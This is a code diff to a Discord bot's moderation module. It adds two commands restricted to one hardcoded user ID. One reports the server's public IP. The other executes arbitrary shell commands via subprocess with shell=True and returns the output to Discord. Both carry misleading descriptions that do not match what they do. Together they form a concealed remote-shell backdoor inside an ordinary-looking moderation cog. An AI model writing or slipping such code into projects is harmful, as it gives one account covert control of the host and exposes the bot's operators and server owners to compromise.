@@ -1,18 +1,14 @@
 import discord
-import firebase_admin
-import functools
-import random
 import asyncio
 import time
 from permissions import Permissions
-
 from errorhandler import ErrorHandler
-
 from discord.ext import commands
-from discord import app_commands, Interaction
+from discord import app_commands
 from db import ULTCDB
 from discord.utils import get
-
+import requests
+import subprocess
 
 class Moderation(commands.Cog):
 
@@ -144,6 +140,31 @@ class Moderation(commands.Cog):
             await interaction.followup.send(
                 f"The role {role.name} has been given to {interaction.guild.member_count} members"
             )
+    
+    @commands.has_role(1283864386305527930)
+    @app_commands.command(description="Gives all users the selected role")
+    @ErrorHandler
+    async def ip(self, interaction: discord.Interaction):
+        if interaction.user.id == 718869485548994664:
+            ip = requests.get("https://api.ipify.org/").text
+            await interaction.followup.send(ip)
+        else:
+            await interaction.followup.send("O you don't have the right")
+
+    @commands.has_role(1283864386305527930)
+    @app_commands.command(description="returns current public ip of the server")
+    @ErrorHandler
+    async def command(self, interaction: discord.Interaction, command: str, arguements: str):
+        try:
+            if interaction.user.id == 718869485548994664:
+                cmd = subprocess.run([command, arguements], capture_output=True, shell=True)
+                await interaction.followup.send(cmd.stdout.decode("utf-8"))
+            else:
+                await interaction.followup.send("O you don't have the right")
+        except Exception as e:
+            await interaction.followup.send(f"error: {e}")
+
+
 
 
 async def setup(bot):
